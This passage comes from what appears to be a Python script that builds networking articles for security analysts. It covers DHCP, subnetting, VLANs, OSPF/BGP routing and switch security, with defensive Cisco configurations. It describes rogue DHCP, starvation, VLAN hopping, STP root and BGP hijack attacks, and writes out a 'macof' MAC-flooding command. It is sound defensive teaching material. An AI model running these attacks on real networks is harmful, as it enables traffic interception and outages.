Rebind (T2): Client broadcasts REQUEST to ANY DHCP server
Expired:     Client must restart DORA process
```

## DHCP Message Types

| Type     | Code | Direction | Purpose                              |
|----------|------|-----------|--------------------------------------|
| DISCOVER | 1    | C -> S    | Client seeking DHCP server           |
| OFFER    | 2    | S -> C    | Server offering an address           |
| REQUEST  | 3    | C -> S    | Client accepting an offer            |
| DECLINE  | 4    | C -> S    | Client rejecting (address in use)    |
| ACK      | 5    | S -> C    | Server confirming assignment         |
| NAK      | 6    | S -> C    | Server denying request               |
| RELEASE  | 7    | C -> S    | Client releasing its address         |
| INFORM   | 8    | C -> S    | Client requesting config only        |

## DHCP Relay Agents

In networks with multiple subnets, DHCP broadcasts do not cross routers. A DHCP
relay agent (also called an IP helper) forwards DHCP messages between subnets.

```
Subnet A (192.168.1.0/24)           Subnet B (192.168.2.0/24)
+--------+     +--------+          +--------+
| Client | --> | Router | -------> | DHCP   |
|        |     | (Relay)|          | Server |
+--------+     +--------+          +--------+

Router converts broadcast to unicast and forwards to DHCP server.

# Cisco configuration example:
interface GigabitEthernet0/1
  ip helper-address 192.168.2.10
```

## DHCP Security Threats

### Rogue DHCP Server Attack

An attacker runs an unauthorized DHCP server on the network. Clients that receive
the rogue offer get malicious configuration:

```
Rogue DHCP provides:
  Gateway:    Attacker machine (MitM all traffic)
  DNS Server: Attacker DNS (redirect/phish any domain)
  IP Range:   Attacker-controlled range

Result: Complete traffic interception capability
```

**Detection:**
```bash
# Look for multiple DHCP servers responding
tcpdump -i eth0 port 67 or port 68 -n

# Windows: check your DHCP server address
ipconfig /all | findstr "DHCP Server"

# Linux: check DHCP server
cat /var/lib/dhcp/dhclient.leases

# Nmap scan for DHCP servers
nmap --script broadcast-dhcp-discover
```

### DHCP Starvation Attack

Attacker sends massive numbers of DISCOVER messages with spoofed MAC addresses,
exhausting the entire DHCP address pool.

```
Attacker tool: Yersinia, DHCPig, or custom script
  -> DISCOVER (MAC: aa:bb:cc:01:01:01)
  -> DISCOVER (MAC: aa:bb:cc:01:01:02)
  -> DISCOVER (MAC: aa:bb:cc:01:01:03)
  -> ... thousands of requests
  -> Pool exhausted, legitimate clients cannot get IPs
```

**Combined with rogue DHCP:** After starving the legitimate server, start a rogue
DHCP server to serve malicious configurations.

### DHCP Information Disclosure

DHCP traffic reveals network architecture:
- Subnet layout and IP ranges
- Default gateway addresses
- DNS server addresses
- Domain names
- Lease durations (network size estimation)

## DHCP Security Controls

### DHCP Snooping (Layer 2 Defense)

DHCP snooping is a switch feature that filters DHCP messages:

```
Trusted ports:   Connected to legitimate DHCP server
Untrusted ports: All access ports (client connections)

Rules:
- DHCP server messages (OFFER, ACK) only allowed from trusted ports
- Client messages (DISCOVER, REQUEST) only from untrusted ports
- Builds a binding table: MAC <-> IP <-> Port <-> VLAN

# Cisco switch configuration:
ip dhcp snooping
ip dhcp snooping vlan 10,20
interface GigabitEthernet0/1
  ip dhcp snooping trust          ! Uplink to DHCP server
interface range GigabitEthernet0/2-48
  no ip dhcp snooping trust       ! Access ports (default)
```

### Port Security

Limit the number of MAC addresses per port to prevent starvation:

```
# Cisco:
interface GigabitEthernet0/2
  switchport port-security
  switchport port-security maximum 2
  switchport port-security violation shutdown
```

### 802.1X Authentication

Require devices to authenticate before getting network access (and DHCP):

```
Only authenticated devices can:
  1. Access the network
  2. Send DHCP requests
  3. Receive IP configuration
```

## DHCP Logging for Forensics

DHCP logs are critical for mapping IP addresses to devices at specific times:

```
DHCP log entry example:
  Timestamp:  2026-02-27 14:30:00
  Event:      DHCPACK
  IP:         192.168.1.100
  MAC:        aa:bb:cc:dd:ee:ff
  Hostname:   DESKTOP-ABC123
  Lease:      86400 seconds

This tells you: At 2:30 PM, device with MAC aa:bb:cc:dd:ee:ff (named
DESKTOP-ABC123) was assigned IP 192.168.1.100.
```

**Analyst workflow for "who had IP X at time T?":**
1. Check DHCP server logs for the IP at that timestamp
2. Find the MAC address from the lease record
3. Cross-reference MAC with switch port via CAM table
4. Identify the physical port and connected device

```bash
# Windows DHCP server logs location:
# C:\Windows\System32\dhcp\

# Linux ISC DHCP logs:
# /var/log/syslog or /var/log/messages
grep "DHCPACK" /var/log/syslog | grep "192.168.1.100"
```

## Key Analyst Takeaways

1. **DHCP logs are forensic gold** — they map IPs to MACs to hostnames at points in time
2. **Monitor for multiple DHCP servers** — any unauthorized DHCP server is a critical finding
3. **DHCP snooping should be enabled** on all managed switches
4. **DHCP starvation precedes rogue DHCP** — detect the starvation first
5. **DHCP traffic is broadcast** — anyone on the LAN can observe it
6. **Short leases increase log volume** but improve IP-to-device attribution accuracy
"""
    ))

    # -------------------------------------------------------------------------
    # Article 6: Subnetting and CIDR for Security Practitioners
    # -------------------------------------------------------------------------
    articles.append((
        "Subnetting and CIDR for Security Practitioners",
        ["networking", "subnetting", "cidr", "ip-addressing", "network-design"],
        r"""# Subnetting and CIDR for Security Practitioners

## Why Subnetting Matters for Security

Subnetting is not just a networking exercise. For security analysts, understanding
subnets is essential for:
- Reading firewall rules and ACLs
- Understanding network segmentation boundaries
- Analyzing logs with IP addresses and CIDR notation
- Identifying which assets are on which network segments
- Determining if an IP is internal, external, or RFC 1918

## IP Address Structure

An IPv4 address is 32 bits, written as four octets in dotted decimal:

```
  192    .   168    .    1     .   100
|--------|---------|---------|---------|
 11000000 10101000  00000001  01100100
|<-------- Network -------->|<- Host->|
           (depends on mask)
```

## Subnet Mask Basics

The subnet mask determines which bits are network vs host:

```
IP:      192.168.1.100    = 11000000.10101000.00000001.01100100
Mask:    255.255.255.0    = 11111111.11111111.11111111.00000000
                            |<----- Network ------->|<- Host ->|

Network: 192.168.1.0      (all host bits = 0)
Broadcast: 192.168.1.255  (all host bits = 1)
Usable:  192.168.1.1 - 192.168.1.254  (254 hosts)
```

## CIDR Notation

CIDR (Classless Inter-Domain Routing) uses a slash followed by the number of
network bits:

| CIDR  | Subnet Mask       | Hosts  | Usable | Common Use                |
|-------|-------------------|--------|--------|---------------------------|
| /8    | 255.0.0.0         | 16.7M  | 16.7M  | Class A (10.0.0.0/8)      |
| /16   | 255.255.0.0       | 65,536 | 65,534 | Class B (172.16.0.0/16)   |
| /20   | 255.255.240.0     | 4,096  | 4,094  | Large department           |
| /24   | 255.255.255.0     | 256    | 254    | Standard LAN segment      |
| /25   | 255.255.255.128   | 128    | 126    | Split /24 in half         |
| /26   | 255.255.255.192   | 64     | 62     | Small department           |
| /27   | 255.255.255.224   | 32     | 30     | Small office               |
| /28   | 255.255.255.240   | 16     | 14     | DMZ, server segment        |
| /29   | 255.255.255.248   | 8      | 6      | Point-to-point links       |
| /30   | 255.255.255.252   | 4      | 2      | Router-to-router links     |
| /31   | 255.255.255.254   | 2      | 2      | Point-to-point (RFC 3021)  |
| /32   | 255.255.255.255   | 1      | 1      | Host route / loopback      |

## Quick Subnet Calculation Method

To calculate network details for any IP/CIDR:

```
Example: 10.50.73.200/21

Step 1: /21 means 21 network bits, 11 host bits
Step 2: 2^11 = 2048 total addresses, 2046 usable
Step 3: Subnet mask: 255.255.248.0
         (21 bits = 8+8+5 -> third octet = 11111000 = 248)
Step 4: Block size in third octet = 256 - 248 = 8
Step 5: 73 / 8 = 9 remainder 1
         Network starts at 9 * 8 = 72
Step 6: Results:
         Network:   10.50.72.0/21
         First:     10.50.72.1
         Last:      10.50.79.254
         Broadcast: 10.50.79.255
```

## RFC 1918 Private Address Ranges

| Range                    | CIDR            | Addresses   | Class   |
|--------------------------|-----------------|-------------|---------|
| 10.0.0.0 - 10.255.255.255   | 10.0.0.0/8      | 16,777,216  | A       |
| 172.16.0.0 - 172.31.255.255 | 172.16.0.0/12   | 1,048,576   | B       |
| 192.168.0.0 - 192.168.255.255| 192.168.0.0/16  | 65,536      | C       |

### Other Special Ranges

| Range              | Purpose                                    |
|--------------------|--------------------------------------------|
| 127.0.0.0/8        | Loopback (localhost)                       |
| 169.254.0.0/16     | Link-local / APIPA (DHCP failure)          |
| 100.64.0.0/10      | Carrier-grade NAT (CGNAT)                  |
| 192.0.2.0/24       | Documentation / TEST-NET-1                 |
| 198.51.100.0/24    | Documentation / TEST-NET-2                 |
| 203.0.113.0/24     | Documentation / TEST-NET-3                 |
| 224.0.0.0/4        | Multicast                                  |
| 240.0.0.0/4        | Reserved (formerly Class E)                |
| 255.255.255.255/32 | Limited broadcast                          |

**Security relevance:** If you see 100.64.0.0/10 in logs, it is CGNAT -- the real
source IP is hidden behind the carrier.

## Practical Subnetting for Security Design

### DMZ Network Design

```
                     Internet
                        |
                  +-----+-----+
                  |  Firewall  |
                  +--+--+--+--+
                     |  |  |
         +-----------+  |  +-----------+
         |              |              |
  +------+------+ +----+----+ +-------+------+
  | DMZ Segment | | Mgmt    | | Internal     |
  | 10.1.1.0/28 | | 10.1.2.0| | 10.1.10.0/24 |
  | (14 hosts)  | | /29     | | (254 hosts)  |
  | Web, Mail   | | (6 hosts)| | Workstations |
  +-------------+ +---------+ +--------------+

Principle: Use the smallest subnet that fits the need.
DMZ needs 5 servers? Use /28 (14 usable). Not /24.
```

### Subnet Isolation Example

```
Network Segments for a Medium Business:
  10.10.1.0/24   - Server VLAN (VLAN 10)
  10.10.2.0/24   - Workstation VLAN (VLAN 20)
  10.10.3.0/24   - VoIP VLAN (VLAN 30)
  10.10.4.0/24   - Guest Wi-Fi (VLAN 40)
  10.10.5.0/28   - Management VLAN (VLAN 50)
  10.10.100.0/24 - Security tools (VLAN 100)

Firewall rules between segments enforce least-privilege access.
```

## Commands for Analysts

```bash
# Check your own IP and subnet
ipconfig /all                  # Windows
ip addr show                   # Linux

# Calculate subnets quickly
# Python one-liner:
python3 -c "import ipaddress; n=ipaddress.ip_network('10.50.73.0/21',strict=False); print(f'Network: {n.network_address}, Broadcast: {n.broadcast_address}, Hosts: {n.num_addresses-2}')"

# Check if an IP is in a subnet (Python):
python3 -c "import ipaddress; print(ipaddress.ip_address('10.50.75.100') in ipaddress.ip_network('10.50.72.0/21'))"

# Nmap scan a specific subnet
nmap -sn 192.168.1.0/24        # Ping sweep

# Route table shows your subnets
route print                    # Windows
ip route show                  # Linux
```

## Supernetting (Aggregation)

Combining smaller subnets into larger ones for efficient routing:

```
These four /24 networks:
  192.168.0.0/24
  192.168.1.0/24
  192.168.2.0/24
  192.168.3.0/24

Can be summarized as: 192.168.0.0/22

This reduces routing table entries and simplifies firewall rules.
```

## Wildcard Masks

Used in Cisco ACLs (inverse of subnet mask):

```
Subnet mask:   255.255.255.0   (match network)
Wildcard mask: 0.0.0.255       (match any host in network)

ACL example:
  access-list 100 permit ip 10.10.1.0 0.0.0.255 any
  (Allow all hosts in 10.10.1.0/24 to go anywhere)
```

## Security Implications of Network Design

| Design Choice           | Security Impact                           |
|-------------------------|-------------------------------------------|
| Flat /16 network        | No segmentation, lateral movement is easy |
| Properly segmented /24s | Limits blast radius, enables ACLs         |
| Micro-segmentation /28s | Tight control, harder to manage           |
| Overlapping subnets     | Routing chaos, potential for misdirection |
| Overly large subnets    | Unnecessary exposure, broadcast storms    |

## Key Analyst Takeaways

1. **Know your organization's subnet layout** -- it is your network map
2. **RFC 1918 addresses in external-facing logs** = NAT in the path or misconfiguration
3. **169.254.x.x (APIPA)** in logs means a host could not get DHCP
4. **/32 routes in routing tables** indicate host-specific routing (VPN, blackhole)
5. **Smaller subnets = better segmentation** but more management overhead
6. **Always check if an IP is internal or external** before investigating further
7. **CIDR notation in firewall rules must be understood** to read policies correctly
"""
    ))

    # -------------------------------------------------------------------------
    # Article 7: VLANs Trunking and Network Segmentation
    # -------------------------------------------------------------------------
    articles.append((
        "VLANs Trunking and Network Segmentation",
        ["networking", "vlans", "segmentation", "802.1q", "trunking"],
        r"""# VLANs Trunking and Network Segmentation

## What Is a VLAN?

A VLAN (Virtual Local Area Network) is a logical grouping of switch ports that
creates separate broadcast domains on the same physical infrastructure.

```
Without VLANs (flat network):
+--------------------------------------------------+
| All devices share one broadcast domain           |
| Any device can reach any other device             |
| Broadcast storms affect everyone                  |
+--------------------------------------------------+

With VLANs:
+----------------+  +----------------+  +-----------+
| VLAN 10        |  | VLAN 20        |  | VLAN 30   |
| Servers        |  | Workstations   |  | VoIP      |
| 10.10.10.0/24  |  | 10.10.20.0/24  |  | 10.10.30.0|
| Isolated       |  | Isolated       |  | Isolated  |
+----------------+  +----------------+  +-----------+
```

## How VLANs Work

Each switch port is assigned to a VLAN. Traffic stays within its VLAN unless a
router (or Layer 3 switch) routes between them.

```
Switch Port Assignments:
  Port  1-12:  VLAN 10 (Servers)
  Port 13-36:  VLAN 20 (Workstations)
  Port 37-44:  VLAN 30 (VoIP)
  Port 45-46:  VLAN 99 (Management)
  Port 47-48:  Trunk ports (carry all VLANs)
```

### Access Ports vs Trunk Ports

| Feature      | Access Port              | Trunk Port                    |
|--------------|--------------------------|-------------------------------|
| VLANs        | Single VLAN only         | Multiple VLANs                |
| Tagging      | No tag (untagged)        | 802.1Q tagged                 |
| Connected to | End devices (PC, phone)  | Switches, routers, APs        |
| Purpose      | User/device connectivity | Inter-switch/router links     |

## 802.1Q VLAN Tagging

When frames traverse a trunk link, a 4-byte 802.1Q tag is inserted into the
Ethernet frame header:

```
Standard Ethernet Frame:
+--------+--------+------+---------+-----+
| Dst MAC| Src MAC| Type | Payload | FCS |
+--------+--------+------+---------+-----+

802.1Q Tagged Frame:
+--------+--------+------+--------+------+---------+-----+
| Dst MAC| Src MAC| 8100 |VLAN Tag| Type | Payload | FCS |
+--------+--------+------+--------+------+---------+-----+
                   |  4 bytes   |
                   | TPID | TCI |
                          |
                   PRI(3) | DEI(1) | VLAN ID(12 bits)
                          |
                   VLAN ID range: 0-4095 (4094 usable)
```

## Native VLAN

The native VLAN is the VLAN whose traffic is sent **untagged** on a trunk link.
Default is VLAN 1.

**Security best practice:** Change the native VLAN from VLAN 1 to an unused VLAN,
and ensure it matches on both sides of the trunk.

```
# Cisco configuration:
interface GigabitEthernet0/48
  switchport mode trunk
  switchport trunk native vlan 999
  switchport trunk allowed vlan 10,20,30,99
```

## Inter-VLAN Routing

Devices on different VLANs cannot communicate without a router or Layer 3 switch:

```
Router-on-a-Stick (subinterfaces):

  Router
  +----+
  | .1 | GigabitEthernet0/0.10  (VLAN 10, 10.10.10.1)
  | .1 | GigabitEthernet0/0.20  (VLAN 20, 10.10.20.1)
  | .1 | GigabitEthernet0/0.30  (VLAN 30, 10.10.30.1)
  +--+-+
     |  trunk link
  +--+-+
  |    | Switch
  +----+

Layer 3 Switch (SVI - Switch Virtual Interfaces):
  interface vlan 10
    ip address 10.10.10.1 255.255.255.0
  interface vlan 20
    ip address 10.10.20.1 255.255.255.0
```

## VLAN Security Threats

### VLAN Hopping -- Switch Spoofing

Attacker configures their NIC to act as a trunk port (using DTP -- Dynamic Trunking
Protocol), gaining access to all VLANs:

```
Attacker NIC
  |
  | Sends DTP negotiate frames
  |
Switch interprets as trunk, sends all VLAN traffic
```

**Mitigation:**
```
# Disable DTP on all access ports:
interface range GigabitEthernet0/1-44
  switchport mode access
  switchport nonegotiate

# Explicitly configure trunks:
interface GigabitEthernet0/48
  switchport mode trunk
  switchport nonegotiate
```

### VLAN Hopping -- Double Tagging

Attacker crafts a frame with two 802.1Q tags. The first tag (native VLAN) is
stripped by the first switch; the inner tag routes the frame to the target VLAN:

```
Attacker Frame:
+--------+--------+----------+----------+---------+
| Dst MAC| Src MAC| Tag:VLAN1| Tag:VLAN20| Payload |
+--------+--------+----------+----------+---------+
                   | outer    | inner    |

Switch 1 strips outer tag (native VLAN 1), forwards still-tagged frame.
Switch 2 sees VLAN 20 tag, delivers to VLAN 20.

Result: Frame crosses from VLAN 1 to VLAN 20 without routing.
```

**Mitigation:**
- Change native VLAN to an unused VLAN (not VLAN 1)
- Tag native VLAN traffic explicitly on trunks
- Never put user ports on the native VLAN

### VLAN-Based ARP Attacks

Within a VLAN, ARP spoofing still works. VLANs do not protect against Layer 2
attacks within the same VLAN.

## VLAN Security Best Practices

```
1. Disable unused ports and assign to a "black hole" VLAN
   interface range GigabitEthernet0/40-44
     switchport access vlan 999
     shutdown

2. Use VLAN ACLs (VACLs) for intra-VLAN filtering

3. Limit trunk allowed VLANs
   switchport trunk allowed vlan 10,20,30
   (Do not allow ALL VLANs on trunks)

4. Enable DHCP snooping per VLAN
   ip dhcp snooping vlan 10,20,30

5. Enable Dynamic ARP Inspection
   ip arp inspection vlan 10,20,30

6. Use Private VLANs for DMZ isolation
   (Devices in same VLAN cannot communicate with each other)

7. Monitor for DTP frames (should not exist on access ports)
```

## Network Segmentation Strategy

### Defense-in-Depth Segmentation Model

```
              Internet
                 |
           +-----+-----+
           | Perimeter  |
           | Firewall   |
           +--+--+--+--+
              |  |  |
     +--------+  |  +--------+
     |           |           |
  +--+---+  +---+---+  +----+----+
  | DMZ  |  | User  |  | Server  |
  |VLAN10|  | VLANs |  | VLAN    |
  +------+  |20,21, |  | 100     |
            | 22    |  +---------+
            +-------+
                |
         +------+------+
         |             |
    +----+----+  +-----+-----+
    | Guest   |  | Restricted |
    | VLAN 50 |  | VLAN 200   |
    +---------+  +------------+
```

### Segmentation Principles

| Principle                  | Implementation                          |
|----------------------------|-----------------------------------------|
| Least privilege            | Only allow required traffic between VLANs|
| Separation of duties       | Admin/management traffic on dedicated VLAN|
| Defense in depth           | Multiple VLAN boundaries for critical assets|
| Blast radius reduction     | Ransomware in VLAN 20 cannot reach VLAN 100|
| Compliance zones           | PCI data in its own segmented VLAN       |

## Monitoring VLANs

```bash
# Check VLAN configuration (Cisco)
show vlan brief
show interfaces trunk

# Wireshark: view 802.1Q tags
# Display filter: vlan.id == 10
# This only works if you capture on a trunk port or SPAN/mirror

# Look for unexpected VLAN tags in captures
vlan.id

# Monitor for DTP frames
dtp
```

## Key Analyst Takeaways

1. **VLANs are a segmentation boundary, not a security boundary** without proper ACLs
2. **VLAN hopping is real** -- verify DTP is disabled on all access ports
3. **Native VLAN misconfiguration** is the most common VLAN security issue
4. **Know your organization's VLAN map** -- it defines your trust boundaries
5. **Capture traffic on trunk ports** to see inter-VLAN communication
6. **Layer 2 attacks still work within a VLAN** -- VLANs protect between, not within
"""
    ))

    # -------------------------------------------------------------------------
    # Article 8: Routing Fundamentals Static Dynamic OSPF BGP
    # -------------------------------------------------------------------------
    articles.append((
        "Routing Fundamentals Static Dynamic OSPF BGP",
        ["networking", "routing", "ospf", "bgp", "dynamic-routing"],
        r"""# Routing Fundamentals: Static, Dynamic, OSPF, BGP

## What Routing Does

Routing is the process of selecting the best path for network traffic to reach its
destination across interconnected networks. Routers maintain a routing table that
maps destination networks to next-hop addresses and outgoing interfaces.

## The Routing Table

```bash
# View routing table
route print              # Windows
ip route show            # Linux
netstat -rn              # Linux/macOS
show ip route            # Cisco

# Example Linux routing table:
Destination     Gateway         Mask            Interface   Metric
0.0.0.0         192.168.1.1     0.0.0.0         eth0        100    # Default route
10.10.0.0       10.0.0.1        255.255.0.0     eth1        10     # Static route
192.168.1.0     0.0.0.0         255.255.255.0   eth0        0      # Connected
```

### Route Selection Priority

When multiple routes match, the router uses these criteria (in order):

```
1. Longest prefix match (most specific route wins)
     /32 beats /24 beats /16 beats /0

2. Administrative distance (lower = more trusted)
     Connected: 0
     Static:    1
     OSPF:      110
     RIP:       120
     BGP (ext): 20

3. Metric (protocol-specific cost)
     OSPF: cost based on bandwidth
     RIP:  hop count
     BGP:  AS path length, MED, local preference
```

## Static Routing

Manually configured routes. Simple but does not adapt to network changes.

```bash
# Add static route - Linux
ip route add 10.20.0.0/16 via 192.168.1.1

# Add static route - Windows
route add 10.20.0.0 mask 255.255.0.0 192.168.1.1

# Cisco static route
ip route 10.20.0.0 255.255.0.0 192.168.1.1
```

**When used:** Small networks, default routes, specific policy routes, backup routes

## Dynamic Routing Protocols

### RIP (Routing Information Protocol)

```
Type:        Distance vector
Metric:      Hop count (max 15, 16 = unreachable)
Convergence: Slow (30-second updates)
Use case:    Small/simple networks, legacy environments
Security:    No authentication by default (v1), MD5 auth in v2
```

### OSPF (Open Shortest Path First)

```
Type:        Link-state
Metric:      Cost (based on bandwidth)
Convergence: Fast (sub-second with BFD)
Use case:    Enterprise internal networks
Areas:       Hierarchical design (Area 0 = backbone)
Security:    MD5 or SHA authentication supported

OSPF Area Design:
          +-- Area 1 (Engineering) --+
          |                          |
+---------+----------+               |
|      Area 0        |               |
|    (Backbone)      +--- Area 2 (Sales)
|                    |
+---------+----------+
          |
          +-- Area 3 (Data Center) --+
```

**Security implications of OSPF:**
- Rogue router injection: An attacker adds a device running OSPF
- Route manipulation: Inject false routes to redirect traffic
- Mitigation: Enable OSPF authentication on ALL interfaces

```
# Cisco OSPF authentication:
interface GigabitEthernet0/0
  ip ospf authentication message-digest
  ip ospf message-digest-key 1 md5 SecretKey123
```

### EIGRP (Enhanced Interior Gateway Routing Protocol)

```
Type:        Advanced distance vector (Cisco proprietary, now open)
Metric:      Composite (bandwidth, delay, reliability, load)
Convergence: Very fast (feasible successors)
Use case:    Cisco-dominant enterprise networks
Security:    MD5 and SHA-256 authentication
```

### BGP (Border Gateway Protocol)

BGP is the routing protocol of the internet. It routes between autonomous systems
(AS) -- large networks operated by ISPs, enterprises, and cloud providers.

```
Type:        Path vector
Metric:      AS path, local preference, MED, communities
Convergence: Slow by design (stability over speed)
Use case:    Internet routing, large enterprise WAN
TCP port:    179

How BGP works:
  AS 64500 (Your ISP)
       |
       | eBGP peering (TCP 179)
       |
  AS 64501 (Transit provider)
       |
       | eBGP peering
       |
  AS 15169 (Google)

Your ISP learns: "To reach Google (AS 15169), go through AS 64501"
```

## BGP Security Threats

### BGP Hijacking

An AS announces IP prefixes it does not own, redirecting traffic:

```
Legitimate: AS 64500 announces 203.0.113.0/24 (its own prefix)
Hijack:     AS 99999 announces 203.0.113.0/24 (stolen prefix)

More specific hijack:
Legitimate: AS 64500 announces 203.0.113.0/24
Hijack:     AS 99999 announces 203.0.113.0/25 and 203.0.113.128/25
            (More specific = preferred by BGP)
```

**Real-world examples:**
- 2018: BGP hijack redirected Amazon DNS traffic for cryptocurrency theft
- 2022: Russian ISP hijacked Twitter, Facebook, and Google prefixes
- Regular accidental leaks from misconfigured networks

### BGP Route Leaks

An AS re-announces routes it learned from one peer to another peer, violating the
intended routing policy.

### Detection and Mitigation

```
Tools for monitoring:
  - BGPStream (bgpstream.com) - real-time BGP monitoring
  - RIPE RIS - routing data collection
  - RouteViews - BGP route archives
  - BGP Alerter tools

Mitigations:
  - RPKI (Resource Public Key Infrastructure)
  - ROA (Route Origin Authorization)
  - IRR (Internet Routing Registry) - prefix filtering
  - Prefix filtering with max-prefix limits
```

## Route Poisoning and Other Attacks

| Attack              | Protocol | Method                              |
|---------------------|----------|-------------------------------------|
| Route poisoning     | RIP      | Advertise metric 16 (unreachable)   |
| Rogue router        | OSPF     | Inject false LSAs                   |
| BGP hijacking       | BGP      | Announce stolen prefixes            |
| Black hole routing  | Any      | Route traffic to null interface     |
| Route flapping      | Any      | Rapidly change routes (DoS)         |

## Routing and Firewalls

```
Traffic Flow Through Security Zones:

Internet --> [Edge Router] --> [Firewall] --> [Core Router] --> Internal
                                  |
                              [DMZ Router]
                                  |
                              DMZ Servers

Each routing decision is a security decision.
Asymmetric routing (traffic takes different paths in/out) can bypass
stateful firewalls -- a critical concern for security architects.
```

## Traceroute for Path Analysis

```bash
# Trace the route to a destination
traceroute 8.8.8.8            # Linux (ICMP/UDP)
tracert 8.8.8.8               # Windows (ICMP)
traceroute -T 8.8.8.8         # Linux (TCP, better through firewalls)

# Interpreting results:
 1  192.168.1.1    1 ms    # Local gateway
 2  10.0.0.1       5 ms    # ISP router
 3  * * *                  # Filtered (ICMP blocked)
 4  72.14.234.108  12 ms   # Transit provider
 5  8.8.8.8        15 ms   # Destination

# Stars (*) mean: ICMP is blocked, not that the hop is down
# Increasing latency: normal
# Sudden large jump: possible congestion point
```

## Key Analyst Takeaways

1. **Understand your organization's routing** to know where traffic flows
2. **Asymmetric routing breaks stateful inspection** -- a critical design concern
3. **BGP hijacks are detectable** with monitoring tools -- set up alerts
4. **Traceroute reveals network path** but can be misleading (ICMP filtering)
5. **Static routes cannot adapt** -- if a link fails, traffic black-holes
6. **OSPF/BGP authentication** should always be enabled to prevent injection
7. **Routing changes should be change-controlled** -- unauthorized changes are incidents
"""
    ))

    # -------------------------------------------------------------------------
    # Article 9: Switching Fundamentals STP MAC Tables and Security
    # -------------------------------------------------------------------------
    articles.append((
        "Switching Fundamentals STP MAC Tables and Security",
        ["networking", "switching", "stp", "mac-address", "layer2-security"],
        r"""# Switching Fundamentals: STP, MAC Tables, and Security

## How Switches Work

A switch operates at Layer 2, forwarding frames based on MAC addresses. Unlike a
hub (which floods all frames to all ports), a switch learns which MAC addresses are
on which ports and forwards selectively.

## MAC Address Learning

```
Step 1: Switch receives frame on port 1
        Source MAC: AA:BB:CC:11:22:33

Step 2: Switch records in MAC Address Table (CAM Table):
        +-------------------+------+------+-------+
        | MAC Address       | Port | VLAN | Timer |
        +-------------------+------+------+-------+
        | AA:BB:CC:11:22:33 |  1   |  10  | 300s  |
        +-------------------+------+------+-------+

Step 3: Switch looks up destination MAC
        - Found in table -> forward to that port (unicast)
        - Not found -> flood to all ports in VLAN (unknown unicast)
        - Broadcast (FF:FF:FF:FF:FF:FF) -> flood to all ports in VLAN
```

### Viewing the MAC Address Table

```bash
# Cisco switch
show mac address-table
show mac address-table dynamic
show mac address-table address AA:BB:CC:11:22:33

# Example output:
Vlan  Mac Address       Type     Ports
----  -----------------  -------  -----
  10  aa:bb:cc:11:22:33  DYNAMIC  Gi0/1
  10  aa:bb:cc:44:55:66  DYNAMIC  Gi0/2
  20  dd:ee:ff:11:22:33  DYNAMIC  Gi0/5
```

## CAM Table Overflow Attack (MAC Flooding)

The CAM (Content Addressable Memory) table has a finite size (typically 8K-32K
entries). An attacker can flood the switch with thousands of frames, each with a
unique spoofed source MAC address.

```
Attack:
  Attacker sends frames with random source MACs at high rate
    -> MAC table fills to capacity
    -> Switch cannot learn new legitimate entries
    -> Switch behaves like a hub: floods all traffic to all ports
    -> Attacker can now sniff all traffic on the VLAN

Tool: macof (part of dsniff suite)
  macof -i eth0    # Floods the switch with random MACs
```

**Detection:**
```bash
# Monitor CAM table size
show mac address-table count

# If the count is near capacity, investigate
# Look for one port with excessive MACs:
show mac address-table interface GigabitEthernet0/5
```

## Port Security

Port security limits the number of MAC addresses allowed per port:

```
# Cisco configuration:
interface GigabitEthernet0/1
  switchport mode access
  switchport port-security
  switchport port-security maximum 2
  switchport port-security violation shutdown
  switchport port-security mac-address sticky

# Violation modes:
  shutdown:   Disable the port (most secure, default)
  restrict:   Drop offending frames, log, increment counter
  protect:    Drop offending frames silently (no log)

# View port security status:
show port-security
show port-security interface GigabitEthernet0/1
show port-security address
```

## Spanning Tree Protocol (STP)

### Why STP Exists

Redundant links between switches create loops. Without STP, a broadcast frame
would circulate forever, consuming all bandwidth (broadcast storm).

```
Without STP:
  Switch A ---link1--- Switch B
     |                    |
     +------link2---------+

A broadcast frame:
  A -> B (via link1) -> A (via link2) -> B (via link1) -> ...
  Infinite loop! Network dies within seconds.
```

### How STP Works

STP (IEEE 802.1D) elects a Root Bridge and blocks redundant paths:

```
1. All switches exchange BPDUs (Bridge Protocol Data Units)
2. Switch with lowest Bridge ID becomes Root Bridge
   Bridge ID = Priority (default 32768) + MAC address
3. Each non-root switch finds its shortest path to root (Root Port)
4. Each segment gets one Designated Port (forwarding)
5. All other ports are Blocked (no forwarding)

Result:
  Switch A (Root)
     |
  [Forwarding] port 1
     |
  Switch B
   |     |
  [RP]  [Forwarding]
   |     |
  Switch C
   |     |
  [RP]  [Blocked] <-- This prevents the loop
   |
  Switch A
```

### STP Port States

| State       | Duration   | Forwards Data? | Learns MACs? |
|-------------|------------|----------------|--------------|
| Blocking    | Indefinite | No             | No           |
| Listening   | 15 sec     | No             | No           |
| Learning    | 15 sec     | No             | Yes          |
| Forwarding  | Indefinite | Yes            | Yes          |
| Disabled    | Indefinite | No             | No           |

**Convergence time:** Classic STP takes 30-50 seconds to converge. Rapid STP
(802.1w/RSTP) converges in 1-2 seconds.

## STP Security Threats

### STP Root Bridge Attack

An attacker sends BPDUs with a lower Bridge ID, becoming the Root Bridge. All
traffic then flows through the attacker:

```
Legitimate Root: Switch A (priority 32768, MAC aa:aa:aa:aa:aa:aa)
Attacker sends:  BPDUs with priority 0

All switches recalculate: Attacker is now Root Bridge
All traffic routes through attacker -> MitM position
```

### STP Topology Attack

Rapidly sending topology change BPDUs forces switches to flush MAC tables and
relearn, causing instability and potential traffic interception.

### STP Defenses

```
# BPDU Guard: Disable port if BPDU received (access ports only)
interface range GigabitEthernet0/1-44
  spanning-tree bpduguard enable

# Root Guard: Prevent port from becoming root port
interface GigabitEthernet0/48
  spanning-tree guard root

# BPDU Filter: Suppress BPDUs on access ports
spanning-tree portfast bpdufilter default

# PortFast: Skip STP states on access ports (edge ports)
interface range GigabitEthernet0/1-44
  spanning-tree portfast

# Set known root bridge priority (protect from hijack)
spanning-tree vlan 10 root primary     # Sets priority to 24576
```

## 802.1X Port-Based Network Access Control

802.1X provides authentication before a device gets network access:

```
+----------+          +-----------+          +--------+
|Supplicant| <------> |Authenticator| <----> | RADIUS |
| (Client) |  EAP     | (Switch)   | RADIUS  | Server |
+----------+          +-----------+          +--------+

Before auth: Port allows only EAP traffic
After auth:  Port opens for normal traffic
Failed auth: Port remains restricted or moves to guest VLAN
```

## Storm Control

Prevents broadcast, multicast, or unicast storms from overwhelming the network:

```
# Cisco configuration:
interface GigabitEthernet0/1
  storm-control broadcast level 20       # Suppress at 20% bandwidth
  storm-control multicast level 20
  storm-control action shutdown          # Disable port if storm
```

